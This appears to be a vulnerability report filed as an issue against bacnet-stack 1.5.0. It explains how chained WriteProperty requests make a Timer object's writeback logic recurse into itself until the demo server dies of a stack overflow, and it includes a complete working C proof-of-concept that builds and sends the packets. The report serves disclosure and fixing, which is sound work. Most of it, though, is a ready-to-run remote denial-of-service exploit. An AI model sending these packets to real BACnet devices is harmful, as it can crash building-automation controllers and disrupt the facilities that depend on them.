@@ -1,0 +1,322 @@
+issue #1342
+
+Summary
+
+I found a remotely reachable denial-of-service vulnerability in bacnet-stack 1.5.0 affecting the default demo server built from the unmodified apps/server/main.c.
+
+By using legitimate WriteProperty requests to configure a Timer object's state-change writeback behavior and then writing Timer_Running = TRUE, an attacker can cause the Timer object's internal writeback logic to recursively re-enter its own state-transition path until the process terminates with a stack overflow.
+
+This issue is reproducible against the original demo server without modifying apps/server/main.c or any code under src/.
+
+Affected version: v1.5.0
+
+Root cause
+
+The root cause is a missing protection against self-referential internal writeback in the Timer object implementation.
+
+The vulnerable behavior is formed by the interaction of the following logic:
+
+The attacker can use WriteProperty to configure:
+
+State_Change_Values[...]
+List_Of_Object_Property_References
+The Timer object stores manipulated property references that are later consumed during state transitions.
+
+The manipulated property list can be configured so that the Timer's internal writeback target points back to the same Timer object's own state-related property.
+
+When Timer_Running is later written as TRUE, the Timer state machine initiates internal writeback.
+
+That internal writeback re-enters the generic device/property write path, which routes back into the same Timer object's write handler.
+
+Because there is no self-reference rejection, no cycle detection, and no writeback re-entry guard, the call chain becomes recursively self-sustaining and eventually overflows the stack.
+
+
+PoC
+
+#include <arpa/inet.h>
+#include <errno.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/select.h>
+#include <sys/socket.h>
+#include <unistd.h>
+
+#include "bacnet/apdu.h"
+#include "bacnet/bacapp.h"
+#include "bacnet/bacaddr.h"
+#include "bacnet/bacdef.h"
+#include "bacnet/datalink/bvlc.h"
+#include "bacnet/npdu.h"
+#include "bacnet/timer_value.h"
+#include "bacnet/wp.h"
+
+static int udp_send_and_recv(
+    const uint8_t *packet,
+    size_t packet_len,
+    uint16_t src_port,
+    uint16_t dst_port,
+    uint8_t *response,
+    size_t response_size)
+{
+    int sock = -1;
+    int received = -1;
+    struct sockaddr_in src = { 0 };
+    struct sockaddr_in dst = { 0 };
+    struct timeval timeout = { 1, 0 };
+    fd_set read_fds;
+
+    sock = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sock < 0) {
+        perror("socket");
+        return -1;
+    }
+
+    src.sin_family = AF_INET;
+    src.sin_port = htons(src_port);
+    src.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+    if (bind(sock, (struct sockaddr *)&src, sizeof(src)) < 0) {
+        perror("bind");
+        close(sock);
+        return -1;
+    }
+
+    dst.sin_family = AF_INET;
+    dst.sin_port = htons(dst_port);
+    dst.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+    if (sendto(
+            sock, packet, packet_len, 0, (struct sockaddr *)&dst,
+            sizeof(dst)) < 0) {
+        perror("sendto");
+        close(sock);
+        return -1;
+    }
+
+    FD_ZERO(&read_fds);
+    FD_SET(sock, &read_fds);
+    if (select(sock + 1, &read_fds, NULL, NULL, &timeout) > 0) {
+        received = recv(sock, response, response_size, 0);
+        if (received < 0) {
+            perror("recv");
+        }
+    } else {
+        received = 0;
+    }
+
+    close(sock);
+    return received;
+}
+
+static size_t build_wp_packet_raw(
+    uint8_t *packet,
+    size_t packet_size,
+    uint8_t invoke_id,
+    BACNET_OBJECT_TYPE object_type,
+    uint32_t object_instance,
+    BACNET_PROPERTY_ID property_id,
+    uint32_t array_index,
+    uint8_t priority,
+    const uint8_t *application_data,
+    size_t application_len)
+{
+    BACNET_WRITE_PROPERTY_DATA wp = { 0 };
+    BACNET_NPDU_DATA npdu_data = { 0 };
+    BACNET_ADDRESS dest = { 0 };
+    int npdu_len = 0;
+    int apdu_len = 0;
+    uint16_t total_len = 0;
+
+    if (application_len > sizeof(wp.application_data)) {
+        fprintf(stderr, "application data too large\n");
+        return 0;
+    }
+
+    wp.object_type = object_type;
+    wp.object_instance = object_instance;
+    wp.object_property = property_id;
+    wp.array_index = array_index;
+    wp.application_data_len = application_len;
+    memcpy(wp.application_data, application_data, application_len);
+    wp.priority = priority;
+
+    npdu_encode_npdu_data(&npdu_data, true, MESSAGE_PRIORITY_NORMAL);
+    npdu_len = npdu_encode_pdu(&packet[4], &dest, NULL, &npdu_data);
+    if (npdu_len <= 0) {
+        fprintf(stderr, "failed to encode NPDU\n");
+        return 0;
+    }
+
+    apdu_len = wp_encode_apdu(&packet[4 + npdu_len], invoke_id, &wp);
+    if (apdu_len <= 0) {
+        fprintf(stderr, "failed to encode APDU\n");
+        return 0;
+    }
+
+    total_len = 4 + npdu_len + apdu_len;
+    if (total_len > packet_size) {
+        fprintf(stderr, "packet too large\n");
+        return 0;
+    }
+
+    bvlc_encode_header(
+        packet, packet_size, BVLC_ORIGINAL_UNICAST_NPDU, total_len);
+
+    return total_len;
+}
+
+static void print_response(const uint8_t *response, int response_len)
+{
+    int i;
+    uint8_t message_type = 0;
+    uint16_t message_len = 0;
+    BACNET_NPDU_DATA npdu_data = { 0 };
+    int offset = 0;
+
+    if (response_len <= 0) {
+        printf("no response\n");
+        return;
+    }
+
+    printf("response[%d] =", response_len);
+    for (i = 0; i < response_len; i++) {
+        printf(" %02x", response[i]);
+    }
+    printf("\n");
+
+    offset = bvlc_decode_header(response, response_len, &message_type, &message_len);
+    if (offset <= 0) {
+        printf("invalid BVLC response\n");
+        return;
+    }
+
+    offset += bacnet_npdu_decode(
+        &response[offset], response_len - offset, NULL, NULL, &npdu_data);
+    if (offset <= 4) {
+        printf("invalid NPDU response\n");
+        return;
+    }
+
+    printf("apdu-type=0x%02x\n", response[offset]);
+}
+
+static size_t build_state_change_packet(
+    uint8_t *packet,
+    size_t packet_size,
+    uint8_t invoke_id,
+    uint32_t timer_instance,
+    uint32_t array_index,
+    bool boolean_value)
+{
+    BACNET_TIMER_STATE_CHANGE_VALUE value = { 0 };
+    uint8_t application_data[MAX_APDU] = { 0 };
+    int application_len = 0;
+
+    value.tag = BACNET_APPLICATION_TAG_BOOLEAN;
+    value.type.Boolean = boolean_value;
+    application_len = bacnet_timer_value_encode(
+        application_data, sizeof(application_data), &value);
+    if (application_len <= 0) {
+        fprintf(stderr, "failed to encode timer state change value\n");
+        return 0;
+    }
+
+    return build_wp_packet_raw(
+        packet, packet_size, invoke_id, OBJECT_TIMER, timer_instance,
+        PROP_STATE_CHANGE_VALUES, array_index, BACNET_NO_PRIORITY,
+        application_data, (size_t)application_len);
+}
+
+static size_t build_member_packet(
+    uint8_t *packet, size_t packet_size, uint8_t invoke_id, uint32_t timer_instance)
+{
+    BACNET_DEVICE_OBJECT_PROPERTY_REFERENCE ref = { 0 };
+    BACNET_APPLICATION_DATA_VALUE value = { 0 };
+    uint8_t application_data[MAX_APDU] = { 0 };
+    int application_len = 0;
+
+    ref.objectIdentifier.type = OBJECT_TIMER;
+    ref.objectIdentifier.instance = timer_instance;
+    ref.propertyIdentifier = PROP_TIMER_RUNNING;
+    ref.arrayIndex = BACNET_ARRAY_ALL;
+    ref.deviceIdentifier.type = OBJECT_DEVICE;
+    ref.deviceIdentifier.instance = 123;
+
+    value.tag = BACNET_APPLICATION_TAG_DEVICE_OBJECT_PROPERTY_REFERENCE;
+    value.type.Device_Object_Property_Reference = ref;
+    application_len = bacapp_encode_data(application_data, &value);
+    if (application_len <= 0) {
+        fprintf(stderr, "failed to encode timer member reference\n");
+        return 0;
+    }
+
+    return build_wp_packet_raw(
+        packet, packet_size, invoke_id, OBJECT_TIMER, timer_instance,
+        PROP_LIST_OF_OBJECT_PROPERTY_REFERENCES, BACNET_ARRAY_ALL,
+        BACNET_NO_PRIORITY, application_data, (size_t)application_len);
+}
+
+static size_t build_running_packet(
+    uint8_t *packet, size_t packet_size, uint8_t invoke_id, uint32_t timer_instance)
+{
+    BACNET_APPLICATION_DATA_VALUE value = { 0 };
+    uint8_t application_data[MAX_APDU] = { 0 };
+    int application_len = 0;
+
+    value.tag = BACNET_APPLICATION_TAG_BOOLEAN;
+    value.type.Boolean = true;
+    application_len = bacapp_encode_data(application_data, &value);
+    if (application_len <= 0) {
+        fprintf(stderr, "failed to encode timer running value\n");
+        return 0;
+    }
+
+    return build_wp_packet_raw(
+        packet, packet_size, invoke_id, OBJECT_TIMER, timer_instance,
+        PROP_TIMER_RUNNING, BACNET_ARRAY_ALL, BACNET_NO_PRIORITY,
+        application_data, (size_t)application_len);
+}
+
+int main(int argc, char *argv[])
+{
+    uint8_t packet[2048] = { 0 };
+    uint8_t response[2048] = { 0 };
+    size_t packet_len = 0;
+    int response_len = 0;
+
+    if (argc != 2) {
+        fprintf(stderr, "usage: %s scv1|scv3|member|run\n", argv[0]);
+        return 1;
+    }
+
+    if (strcmp(argv[1], "scv1") == 0) {
+        packet_len = build_state_change_packet(packet, sizeof(packet), 1, 1, 1, true);
+    } else if (strcmp(argv[1], "scv3") == 0) {
+        packet_len = build_state_change_packet(packet, sizeof(packet), 2, 1, 3, true);
+    } else if (strcmp(argv[1], "member") == 0) {
+        packet_len = build_member_packet(packet, sizeof(packet), 3, 1);
+    } else if (strcmp(argv[1], "run") == 0) {
+        packet_len = build_running_packet(packet, sizeof(packet), 4, 1);
+    } else {
+        fprintf(stderr, "unknown mode: %s\n", argv[1]);
+        return 1;
+    }
+
+    if (packet_len == 0) {
+        return 1;
+    }
+
+    printf("packet[%zu] =", packet_len);
+    for (size_t i = 0; i < packet_len; i++) {
+        printf(" %02x", packet[i]);
+    }
+    printf("\n");
+
+    response_len = udp_send_and_recv(
+        packet, packet_len, 47809, 47808, response, sizeof(response));
+    print_response(response, response_len);
+
+    return 0;
+}
+
